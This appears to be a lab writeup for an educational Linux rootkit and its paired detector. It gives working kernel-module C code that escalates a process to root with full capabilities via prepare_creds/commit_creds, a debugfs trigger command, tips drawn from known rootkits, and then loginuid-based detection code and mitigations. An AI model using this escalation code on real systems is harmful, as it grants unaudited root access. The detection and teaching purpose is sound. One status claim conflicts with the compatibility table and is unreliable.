# 02 — Cred modification + audit-trail detection

_Stage 2 of the shadowfox + lighthouse project. Paired writeup for
the privilege-escalation primitive in `modules/shadowfox/cred.c`
and the cred-anomaly detector in `modules/lighthouse/detect_cred.c`._

> **Status.** Built and smoke-tested on the lab VM against kernel
> `6.6.138-0606138-generic`. End-to-end demo (researcher shell →
> kernel-mode escalate → detector flags it with the same warning
> as legitimate sudo/su) passes.

---

## 1. Overview

Every task in Linux carries a `struct cred` that records its UID,
GID, and capability sets. The kernel's privilege checks
(`capable()`, `ns_capable()`, every file-permission decision) read
from `current`'s cred — never from any user-space record. A kernel
module with `MODULE_LICENSE("GPL")` and access to the exported
`prepare_creds()` / `commit_creds()` pair can therefore make any
task running root with full capabilities, in two function calls.

The interesting asymmetry — and the foundation of detection — is
that `task->loginuid` is **not** part of `struct cred`. It lives on
`struct task_struct` and is updated only by the audit subsystem at
PAM/login time. A kernel-mode `commit_creds()` swap leaves
`loginuid` untouched. So a task with `cred->uid == 0` but
`loginuid > 0 && loginuid != INVALID_UID` is either:

- a setuid-root exec descendant (sudo, su, login, any setuid
  binary), with a legitimate audit chain, **or**
- a kernel-injected escalation, with no audit chain at all.

Stage 2's detector flags both. Distinguishing them requires
walking the exec chain, which lands in Stage 4 territory (file
inode work); the false-positive surface is itself the educational
artefact.

## 2. Kernel internals involved

### `struct cred`

A reference-counted record holding everything the kernel uses to
authorise privileged operations:

```c
struct cred {
    atomic_long_t   usage;
    kuid_t          uid, gid;             /* real */
    kuid_t          suid, sgid;           /* saved */
    kuid_t          euid, egid;           /* effective */
    kuid_t          fsuid, fsgid;         /* fs-related */
    kernel_cap_t    cap_inheritable;
    kernel_cap_t    cap_permitted;
    kernel_cap_t    cap_effective;
    kernel_cap_t    cap_bset;             /* bounding set */
    kernel_cap_t    cap_ambient;
    ... /* keyring, security, user_ns, etc. */
};
```

`kuid_t`/`kgid_t` are opaque kernel UID/GID types — compare with
`uid_eq()`, convert to userspace `uid_t` with `from_kuid(&init_user_ns, ...)`.

### `prepare_creds()` and `commit_creds()`

```c
struct cred *prepare_creds(void);       /* EXPORT_SYMBOL */
int          commit_creds(struct cred *new);  /* EXPORT_SYMBOL */
void         abort_creds(struct cred *new);   /* EXPORT_SYMBOL */
```

`prepare_creds()` returns a writable copy of `current`'s cred,
ready to be modified and committed. `commit_creds()` consumes the
prepared cred and installs it on `current` — after a successful
call, the caller must not touch the cred again. On failure,
`commit_creds()` itself releases the cred; the caller should not
call `abort_creds()` in either case.

This is the public, exported, stable-since-forever path. We
deliberately do NOT use `prepare_kernel_cred(NULL)` — that path
was reworked in 6.5+ (commit `5af43c24ca59`, "kernel: cred: open
code prepare_kernel_cred(NULL)") and its behaviour now varies
across point releases.

### `task_struct->loginuid` and the audit subsystem

```c
struct task_struct {
    ...
#ifdef CONFIG_AUDIT
    kuid_t          loginuid;
    unsigned int    sessionid;
#endif
    ...
};
```

Set once, by PAM via `audit_set_loginuid()` after authentication.
Inherited across `fork()` and `exec()`. **Never** touched by
`commit_creds()`. Accessed portably via:

```c
kuid_t audit_get_loginuid(struct task_struct *tsk);
```

which returns `INVALID_UID` when `CONFIG_AUDIT=n` so a single
check works on either kernel.

### `for_each_process()` and RCU

```c
rcu_read_lock();
for_each_process(task) {
    const struct cred *c = __task_cred(task);
    /* ... */
}
rcu_read_unlock();
```

The task list is RCU-protected for readers. `__task_cred()`
returns the cred without taking a reference — safe under
`rcu_read_lock()` for the duration of the dereference.

## 3. Implementation walkthrough (shadowfox side)

The whole offensive primitive is ~30 lines under
`modules/shadowfox/cred.c`. No kallsyms work — both functions we
need are exported.

```c
int sf_escalate_current(void)
{
    struct cred *new;

    new = prepare_creds();
    if (!new)
        return -ENOMEM;

    new->uid   = new->euid = new->suid = new->fsuid = GLOBAL_ROOT_UID;
    new->gid   = new->egid = new->sgid = new->fsgid = GLOBAL_ROOT_GID;

    new->cap_inheritable = CAP_FULL_SET;
    new->cap_permitted   = CAP_FULL_SET;
    new->cap_effective   = CAP_FULL_SET;
    new->cap_bset        = CAP_FULL_SET;
    new->cap_ambient     = CAP_FULL_SET;

    commit_creds(new);
    return 0;
}
```

Three things worth highlighting:

1. **All four UID pairs.** Real, effective, saved, and fs. Missing
   any one of them creates a half-state where some checks pass
   (`euid == 0`) and others fail (`uid != 0`), which is worse than
   not escalating at all — it confuses both user-space tooling and
   the rootkit itself.
2. **`cap_bset`.** The bounding set is the upper limit of what the
   process and its descendants can ever acquire. Leaving it as the
   non-root user's bounding set caps what the elevated process can
   actually do, regardless of `cap_effective`.
3. **`cap_ambient`.** Preserved across exec only when the bits are
   also in `cap_inheritable` and `cap_permitted`. We set all three
   so the elevation survives `execve` into a new binary.

### Trigger

Wiring is in `main.c`'s existing debugfs write handler:

```
echo escalate | sudo tee /sys/kernel/debug/shadowfox/ctl
```

The handler runs in process context as the writer — `current`
points at the task we want to elevate. After the write returns,
the writer's shell is root for the rest of its lifetime.

We use debugfs rather than the magic-signal pattern that
Diamorphine uses because the signal path requires a syscall hook,
which belongs to Stage 3.

### What we deliberately did NOT add

- **Per-PID escalation.** The user can always background a shell
  and `tee` from there. Per-PID would need either work-queue
  scheduling on the target task or a syscall context provided by
  the target — both materially more code for a small ergonomic
  win.
- **De-escalation.** Once committed, the elevation is permanent
  for the process's lifetime. To revert, the user exits the
  process. This matches Diamorphine.

## 4. Kernel version compatibility matrix

| Kernel        | Status                  | Notes                                                                                       |
|---------------|-------------------------|---------------------------------------------------------------------------------------------|
| < 5.x         | Should work             | Same API, `prepare_creds`/`commit_creds` stable since 2.6.29.                               |
| 5.x – 6.4     | Should work             | `prepare_kernel_cred(NULL)` was the canonical shortcut; we don't use it, so no concern.     |
| **6.6 LTS**   | **Target**              | Pinned: `6.6.138-0606138-generic`. Smoke test pending.                                      |
| 6.5+          | Watch                   | `prepare_kernel_cred(NULL)` semantics changed (commit `5af43c24ca59`). We avoid that path entirely. |
| 6.8+          | Unverified              | No known cred-API changes; should work.                                                     |

The detector's only kernel-version dependency is `audit_get_loginuid()`,
which has been stable since CONFIG_AUDIT was introduced.

## 5. Detection counterpart

Detection lives in `modules/lighthouse/detect_cred.c`. Single
function, single walk:

```c
rcu_read_lock();
for_each_process(task) {
    const struct cred *c = __task_cred(task);
    kuid_t uid      = c->uid;
    kuid_t loginuid = audit_get_loginuid(task);

    if (uid_eq(uid, GLOBAL_ROOT_UID) &&
        !uid_eq(loginuid, INVALID_UID) &&
        !uid_eq(loginuid, GLOBAL_ROOT_UID)) {
        pr_warn("cred anomaly: pid=%d comm=%s uid=0 loginuid=%u\n",
                task->pid, task->comm,
                from_kuid(&init_user_ns, loginuid));
    }
}
rcu_read_unlock();
```

### What this catches

- shadowfox-escalated processes: writer was a real user, escalation
  bypassed audit → `uid=0, loginuid=<user>`. **Flagged.**
- sudo / su children: writer is a real user, exec'd a setuid-root
  binary → `uid=0, loginuid=<user>`. **Flagged.**

The two cases are indistinguishable from this signal alone — and
that is the point of Stage 2. The writeup at section 7 names the
refinement (walk `task->mm->exe_file` and inspect the inode mode)
that would separate them; it belongs to Stage 4.

### What this misses

- A direct root login (`ssh root@host`, `su -` after which an
  attacker took over): `loginuid` becomes `0`, so the asymmetry
  goes away. Defeating loginuid-based detection by simply being
  root from the start is well known; combatants here are
  audit-trail-on-disk and login-event-correlation systems.
- Daemons started by init that never went through PAM:
  `loginuid == INVALID_UID`. Skipped — they have no
  loginuid context to disagree with.
- Kernel threads: `uid == 0, loginuid == INVALID_UID`. Skipped for
  the same reason.

### Wiring into the existing scan trigger

`main.c` calls `lh_detect_cred_anomalies()` from the same two
sites as `lh_detect_hidden_modules()`: on `lighthouse_init` and on
every write to `/sys/kernel/debug/lighthouse/scan`. One trigger
covers every technique we've shipped so far.

## 6. Real-world references

- **Diamorphine** by m0nad —
  [github.com/m0nad/Diamorphine](https://github.com/m0nad/Diamorphine).
  Uses the same `prepare_kernel_cred` / `commit_creds` pattern,
  triggered by `kill -SIGCHLD` to a magic PID (requires a hook on
  the `kill` syscall, which is why shadowfox uses debugfs
  instead).
- **Reptile** by f0rb1dd3n —
  [github.com/f0rb1dd3n/Reptile](https://github.com/f0rb1dd3n/Reptile).
  Same primitive, dispatched by a custom userspace client that
  ioctl's into the kernel module.
- **Linux Audit subsystem documentation** — `Documentation/audit/`
  in the kernel tree, plus the `auditctl(8)` man page. Definitive
  references for `loginuid` semantics.
- **LWN.net** — "Credentials in Linux" series and "User
  namespaces" articles. Background reading on the `kuid_t` /
  `kgid_t` / `user_namespace` model.
- **LKRG (Linux Kernel Runtime Guard)** —
  [www.openwall.com/lkrg](https://www.openwall.com/lkrg/). Open-
  source kernel-mode integrity checker that performs exactly this
  kind of cred validation on each syscall return, plus far more.
  A reasonable reference for what a production version of
  lighthouse would look like.
- **Linux kernel source** — `kernel/cred.c`, `kernel/audit.c`,
  `include/linux/cred.h`, `include/linux/audit.h`. Definitive
  references for the structs and APIs touched.

## 7. Mitigations

Defensive controls that block, hinder, or detect this technique:

- **`CONFIG_MODULE_SIG_FORCE=y`** — Unsigned modules cannot be
  loaded; shadowfox is out-of-tree and unsigned, so it fails to
  load on a sig-forced kernel.
- **Secure Boot + `CONFIG_LOCKDOWN_LSM`** — As Stage 1: blocks the
  module load path and the kprobe-based symbol resolution our
  sibling modules rely on.
- **`CONFIG_AUDIT=y` with auditd live** — Without it, no
  `loginuid`, no detection signal. Distro defaults all enable it;
  hardened/stripped kernels sometimes don't.
- **`audit` rules on `commit_creds`** — Not actually possible in
  vanilla audit; would require an out-of-tree audit hook on the
  cred path. Some EDR products do this.
- **LSM hooks on cred_prepare / cred_commit** — SELinux and
  AppArmor inspect cred transitions but currently don't flag the
  audit-bypass case. A custom LSM could.
- **Exec-chain validation** — The Stage 4-class refinement:
  walk `task->mm->exe_file`, check `inode->i_mode` for `S_ISUID`
  and `i_uid == GLOBAL_ROOT_UID`. Filters the sudo / su / login
  legitimate-escalation false positives.
- **Periodic cross-view auditing** — What lighthouse does. A
  production deployment runs as a kthread on a timer, or on every
  task-exit notification.
- **Volatility / memory forensics** — `volatility3`'s
  `linux.psaux` and `linux.envars` plugins recover task UID/EUID
  from memory dumps; a live cred-swap shows up identically there.

## 8. Lessons learned

- **`prepare_kernel_cred(NULL)` is the obvious thing and the wrong
  thing.** Its semantics moved in 6.5 (commit `5af43c24ca59`).
  `prepare_creds()` + field stomping has been stable since 2.6.29
  and is what every modern educational rootkit should use.
- **All four UID pairs matter.** A naive implementation that only
  sets `euid` will pass `capable()` checks but fail `uid == 0`
  ones — and `ls -la /proc/self/status` will show the
  inconsistency. Real-world rootkits routinely get this wrong.
- **`cap_bset` is upstream of `cap_effective`.** Forget to set it
  and the elevated process is effectively still capped by the
  original user's bounding set, no matter what `cap_effective`
  claims. This was historically a bug in published rootkits.
- **`loginuid` is the right detection signal for this technique,
  with a known false-positive surface.** Naming the false
  positives (`sudo`, `su`, `login`) in the same warning that
  flags the true positives is more honest than silently filtering
  them — the operator reading dmesg sees the trade-off in plain
  English.
- **`audit_get_loginuid()` is the portable accessor.** Reading
  `task->loginuid` directly works on `CONFIG_AUDIT=y` kernels but
  is a compile error otherwise. The accessor returns
  `INVALID_UID` on `CONFIG_AUDIT=n` and our `uid_eq(loginuid,
  INVALID_UID)` check already filters that out.
- **RCU is enough for a read-only task walk.** No tasklist_lock,
  no preempt_disable; just `rcu_read_lock` around the
  `for_each_process` body. The detector is read-only and short-
  lived (microseconds), so RCU's reader-side overhead is
  negligible.

---

_Next technique: Stage 3 — process concealment via ftrace + cross-
view PID detector._
